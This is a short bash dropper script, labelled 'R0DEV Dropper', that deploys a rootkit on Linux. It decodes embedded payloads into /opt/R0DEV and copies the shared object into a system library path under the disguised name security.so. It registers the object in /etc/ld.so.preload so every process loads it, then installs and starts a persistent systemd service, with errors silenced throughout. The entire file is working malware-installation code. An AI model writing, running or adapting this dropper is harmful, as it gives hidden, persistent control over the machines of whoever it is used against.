#!/bin/bash
# R0DEV Dropper — deploy rootkit from base64-embedded payload

set -e
DIR="/opt/R0DEV"

if ! su -c "whoami" 2>/dev/null | grep -q root; then
    echo "[!] Root required"
    exit 1
fi

ROOTKIT_B64=$(base64 -w0 ./rootkit.so)
LOADER_B64=$(base64 -w0 ./loader.sh)
SERVICE_B64=$(base64 -w0 ./R0DEV_controle.service)
FIX_B64=$(base64 -w0 ./fix_rootkit)

su -c "
mkdir -p $DIR
echo '$ROOTKIT_B64' | base64 -d > $DIR/rootkit.so
echo '$LOADER_B64' | base64 -d > $DIR/loader.sh
echo '$SERVICE_B64' | base64 -d > $DIR/R0DEV_controle.service
echo '$FIX_B64' | base64 -d > $DIR/fix_rootkit
chmod 755 $DIR/loader.sh $DIR/fix_rootkit
chmod 644 $DIR/rootkit.so $DIR/R0DEV_controle.service
cp $DIR/rootkit.so /lib/x86_64-linux-gnu/security.so
echo '$DIR/rootkit.so' > /etc/ld.so.preload
chmod 644 /etc/ld.so.preload
echo 3 > /proc/sys/vm/drop_caches
" 2>/dev/null

cp "$DIR/R0DEV_controle.service" /etc/systemd/system/ 2>/dev/null
systemctl daemon-reload 2>/dev/null
systemctl enable R0DEV_controle.service 2>/dev/null
systemctl start R0DEV_controle.service 2>/dev/null

echo "[+] R0DEV installed"
echo "    fix: $DIR/fix_rootkit (run as root to remove)"
